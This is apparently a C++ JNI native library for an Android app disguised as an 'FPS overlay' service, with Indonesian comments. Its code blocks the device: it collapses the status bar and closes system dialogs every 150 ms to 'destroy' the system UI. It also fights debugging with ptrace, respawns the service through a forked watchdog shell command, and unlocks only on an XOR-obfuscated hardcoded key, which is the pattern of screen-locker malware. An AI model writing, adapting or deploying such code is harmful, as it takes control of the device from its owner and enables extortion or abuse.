#include <jni.h>
#include <string>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <cstdio>
#include <signal.h>
#include <sys/ptrace.h>

JavaVM* jvm = nullptr;
jobject serviceObject = nullptr;
pid_t watchdogPid = -1;
volatile bool isRunning = false;

// Kunci: "02042009" (XOR 0x0E)
static const unsigned char SECRET_KEY[] = {0x3E, 0x3C, 0x3E, 0x3A, 0x3C, 0x3E, 0x3E, 0x37};
static const size_t KEY_LEN = 8;

void* aggressiveLoop(void* args) {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) exit(0);

    JNIEnv* env;
    if (jvm->AttachCurrentThread(&env, nullptr) != JNI_OK) return nullptr;

    jclass clazz = env->GetObjectClass(serviceObject);
    jmethodID collapse = env->GetMethodID(clazz, "collapseStatusBar", "()V");
    jmethodID closeDials = env->GetMethodID(clazz, "closeSystemDialogs", "()V");

    if (!collapse || !closeDials) {
        jvm->DetachCurrentThread();
        return nullptr;
    }

    while (isRunning) {
        if (serviceObject == nullptr) break;

        // Panggil method Java yang sudah di-cache
        env->CallVoidMethod(serviceObject, collapse);
        env->CallVoidMethod(serviceObject, closeDials);

        // Tidur 150ms sudah sangat cukup untuk "menghancurkan" UI Sistem
        usleep(150000);
    }

    jvm->DetachCurrentThread();
    return nullptr;
}

void startWatchdog(const char* cmd) {
    watchdogPid = fork();
    if (watchdogPid == 0) {
        while (true) {
            if (getppid() <= 1) {
                system(cmd);
                exit(0);
            }
            sleep(2);
        }
    }
}

extern "C" JNIEXPORT void JNICALL
Java_com_bluestacks_fpsoverlay_FPSService_startNativeAggression(JNIEnv* env, jobject thiz, jstring serviceName) {
    if (isRunning) return;
    
    env->GetJavaVM(&jvm);
    serviceObject = env->NewGlobalRef(thiz);
    isRunning = true;

    const char* name = env->GetStringUTFChars(serviceName, nullptr);
    char cmd[256];
    sprintf(cmd, "am startservice --user 0 -n %s", name);
    env->ReleaseStringUTFChars(serviceName, name);
    
    startWatchdog(cmd);

    pthread_t thread;
    pthread_create(&thread, nullptr, aggressiveLoop, nullptr);
}

extern "C" JNIEXPORT void JNICALL
Java_com_bluestacks_fpsoverlay_FPSService_stopNativeAggression(JNIEnv* env, jobject thiz) {
    isRunning = false;
    if (watchdogPid > 0) {
        kill(watchdogPid, SIGKILL);
        watchdogPid = -1;
    }
    if (serviceObject != nullptr) {
        env->DeleteGlobalRef(serviceObject);
        serviceObject = nullptr;
    }
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_bluestacks_fpsoverlay_FPSAccessibilityService_verifyAdvancedKey(JNIEnv* env, jobject thiz, jstring input) {
    if (input == nullptr) return JNI_FALSE;
    const char* nativeInput = env->GetStringUTFChars(input, nullptr);
    size_t inputLen = strlen(nativeInput);
    bool match = (inputLen == KEY_LEN);
    if (match) {
        for (size_t i = 0; i < KEY_LEN; i++) {
            if ((unsigned char)(nativeInput[i] ^ 0x0E) != SECRET_KEY[i]) {
                match = false;
                break;
            }
        }
    }
    env->ReleaseStringUTFChars(input, nativeInput);
    return match ? JNI_TRUE : JNI_FALSE;
}
